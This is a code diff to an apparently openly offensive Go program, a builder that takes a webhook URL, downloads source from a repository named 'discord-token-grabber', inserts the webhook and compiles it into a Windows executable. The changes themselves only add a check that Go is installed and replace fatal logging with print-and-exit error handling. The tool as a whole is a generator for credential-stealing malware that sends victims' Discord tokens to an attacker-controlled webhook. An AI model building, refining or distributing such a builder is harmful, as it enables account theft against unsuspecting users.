@@ -3,7 +3,6 @@ package main
 import (
 	"fmt"
 	"io/ioutil"
-	"log"
 	"net/http"
 	"os"
 	"os/exec"
@@ -20,6 +19,13 @@ func main() {
 
 `
 	fmt.Println(banner)
+	_, err := exec.Command("go", "version").Output()
+
+	if err != nil {
+		fmt.Println("You must have Go installed and added to your ENVIRONMENT VARIABLES (PATH) in order to use this program.")
+		fmt.Scanln()
+		os.Exit(1)
+	}
 	fmt.Print("> Enter your Webhook URL: ")
 	var url string
 	fmt.Scanln(&url)
@@ -32,7 +38,9 @@ func main() {
 	resp, err := http.Get("https://raw.githubusercontent.com/pedrokpp/discord-token-grabber/main/main.go")
 
 	if err != nil {
-		log.Fatal(" ! Error while trying to HTTP GET -> ", err)
+		fmt.Println(" ! Error while trying to HTTP GET -> ", err)
+		fmt.Scanln()
+		os.Exit(1)
 	}
 
 	defer resp.Body.Close()
@@ -40,7 +48,9 @@ func main() {
 	body, err := ioutil.ReadAll(resp.Body)
 
 	if err != nil {
-		log.Fatal(" ! Error while reading HTTP GET body -> ", err)
+		fmt.Println(" ! Error while reading HTTP GET body -> ", err)
+		fmt.Scanln()
+		os.Exit(1)
 	}
 
 	code := string(body)
@@ -49,7 +59,9 @@ func main() {
 	actualCode := strings.Replace(code, "%s", url, -1)
 	errr := ioutil.WriteFile("tg.go", []byte(actualCode), 0777)
 	if errr != nil {
-		log.Fatal(" ! Error while writing 'tg.go' file -> ", err)
+		fmt.Println(" ! Error while writing 'tg.go' file -> ", err)
+		fmt.Scanln()
+		os.Exit(1)
 	}
 	fmt.Println(" * 'tg.go' file created")
 	fmt.Println("\n * Compiling to .exe")
@@ -59,7 +71,9 @@ func main() {
 	fmt.Println("\n * Removing 'tg.go' file")
 	err = os.Remove("tg.go")
 	if err != nil {
-		log.Fatal(" ! Error while deleting 'tg.go' file -> ", err)
+		fmt.Println(" ! Error while deleting 'tg.go' file -> ", err)
+		fmt.Scanln()
+		os.Exit(1)
 	}
 	fmt.Println(" * 'tg.go' file deleted")
 	fmt.Println("\n # Generation successfully finished")
